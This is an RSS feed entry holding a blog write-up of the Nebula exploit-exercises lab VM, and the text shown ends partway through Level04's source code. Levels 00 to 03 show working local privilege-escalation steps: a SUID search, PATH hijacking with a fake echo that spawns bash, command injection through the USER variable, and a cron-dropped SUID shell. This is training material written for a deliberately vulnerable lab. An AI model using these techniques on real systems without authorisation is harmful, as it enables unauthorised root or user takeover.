<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on </title>
    <link>http://mislusnys.github.io/post/</link>
    <description>Recent content in Posts on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 01 May 2016 04:28:35 +0000</lastBuildDate>
    <atom:link href="http://mislusnys.github.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Nebula Exploit Exercises</title>
      <link>http://mislusnys.github.io/2016/05/01/nebula-exploit-exercises/</link>
      <pubDate>Sun, 01 May 2016 04:28:35 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/2016/05/01/nebula-exploit-exercises/</guid>
      <description>

&lt;h1 id=&#34;intro:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Intro&lt;/h1&gt;

&lt;p&gt;Ever since I stumbled upon exploit exercises website - I wanted to try the challenges. They have three main exploitable VMs: Nebula, Protostar and Fusion.
The order represents the difficulty of exploitation.&lt;/p&gt;

&lt;p&gt;The welcome page reads:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;exploit-exercises.com provides a variety of virtual machines, documentation and challenges
that can be used to learn about a variety of computer
security issues such as privilege escalation, vulnerability analysis, exploit development,
debugging, reverse engineering, and general cyber security issues.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here, I wrote down some of the findings while exploring the Nebula VM.&lt;/p&gt;

&lt;h2 id=&#34;about:2941ec772c52d0561257d6ef26aa317a&#34;&gt;About&lt;/h2&gt;

&lt;p&gt;Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SUID files&lt;/li&gt;
&lt;li&gt;Permissions&lt;/li&gt;
&lt;li&gt;Race conditions&lt;/li&gt;
&lt;li&gt;Shell meta-variables&lt;/li&gt;
&lt;li&gt;$PATH weaknesses&lt;/li&gt;
&lt;li&gt;Scripting language weaknesses&lt;/li&gt;
&lt;li&gt;Binary compilation failures&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.&lt;/p&gt;

&lt;h3 id=&#34;level00:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level00&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the “flag00” account.
You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Finding SUID flag00 files&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level00@nebula:~$ find / -user flag00 -perm -4000 -exec ls -l &lt;span style=&#34;color: #f92672&#34;&gt;{}&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
-rwsr-x--- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag00 level00 &lt;span style=&#34;color: #ae81ff&#34;&gt;7358&lt;/span&gt; 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; flag00 level00 &lt;span style=&#34;color: #ae81ff&#34;&gt;7358&lt;/span&gt; 2011-11-20 21:22 /rofs/bin/.../flag00
level00@nebula:~$
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;




&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Getting the flag&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level00@nebula:~$ id
&lt;span style=&#34;color: #f8f8f2&#34;&gt;uid&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;level00&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;level00&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;groups&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;1001&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;level00&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag 
You have successfully executed getflag on a target account
flag00@nebula:~$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h3 id=&#34;level01:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level01&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Source Code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;gid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;uid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid;&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getegid();&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;geteuid();&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresgid(gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresuid(uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/usr/bin/env echo and now what?&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;p&gt;Here the code uses &lt;code&gt;echo&lt;/code&gt; binary to display a string. We can exploit that by modifying $PATH variable and placing our own version of &lt;code&gt;echo&lt;/code&gt; in the PATH.
We can use the provided source code to get a shell by modifying the last line to execute &lt;code&gt;bash&lt;/code&gt;:&lt;/p&gt;



&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Exploiting $PATH weakness&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level01@nebula:/home/flag01$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;PATH&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;/tmp:$PATH
level01@nebula:/home/flag01$ cat /tmp/setuid.c 
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

int main&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;int argc, char **argv, char **envp&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
  gid_t gid&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  uid_t uid&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; getegid&lt;span style=&#34;color: #f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; geteuid&lt;span style=&#34;color: #f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

  setresgid&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;gid, gid, gid&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
  setresuid&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;uid, uid, uid&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;

  system&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
level01@nebula:/home/flag01$ gcc /tmp/setuid.c -o /tmp/echo
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag 
You have successfully executed getflag on a target account
flag01@nebula:/home/flag01$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;


&lt;h3 id=&#34;level02:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level02&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Source Code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;gid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;uid_t&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid;&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getegid();&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;geteuid();&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresgid(gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gid);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;setresuid(uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;uid);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL;&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;asprintf(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/echo %s is cool&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;));&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;about to call system(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer);&lt;/span&gt;
  
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(buffer);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Here, we can inject additional commands into $USER environment variable and terminate the buffer with #:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Command Injection&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level02@nebula:/home/flag02$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;USER&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user &amp;amp;&amp;amp; /bin/bash #&amp;quot;&lt;/span&gt;
level02@nebula:/home/flag02$ ./flag02 
about to call system&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/echo user &amp;amp;&amp;amp; /bin/bash # is cool&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
user
flag02@nebula:/home/flag02$ getflag 
You have successfully executed getflag on a target account
flag02@nebula:/home/flag02$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level03:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level03&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level runs crontab every few minutes which executes anything from &lt;code&gt;writable.d&lt;/code&gt; folder and then removes it.
We can reuse &lt;code&gt;/tmp/setuid.c&lt;/code&gt; file from previous levels:&lt;/p&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Exploiting Crontab&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level03@nebula:/home/flag03/writable.d$ cat exploit.sh
&lt;span style=&#34;color: #75715e&#34;&gt;#!/bin/bash&lt;/span&gt;

gcc /tmp/setuid.c -o /home/flag03/shell
chmod +s /home/flag03/shell
level03@nebula:/home/flag03/writable.d$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; ..
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ getflag 
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;level04:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level04&lt;/h3&gt;

&lt;p&gt;Description:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;Source Code&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt;
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;envp)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc;&lt;/span&gt;

